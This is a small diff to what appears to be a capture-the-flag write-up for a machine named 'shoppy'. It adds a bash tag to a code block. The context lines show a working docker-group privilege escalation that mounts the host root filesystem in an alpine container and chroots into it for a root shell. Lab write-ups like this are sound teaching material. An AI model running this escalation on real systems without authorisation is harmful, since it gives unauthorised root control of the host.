@@ -278,7 +278,7 @@ As you can see we are in the docker group so we can run the command itself and i
 
 So we can try to run it and see if we get the root shell.
 
-```
+```bash
 deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # bash -p
 root@32b576fa8df3:/# id
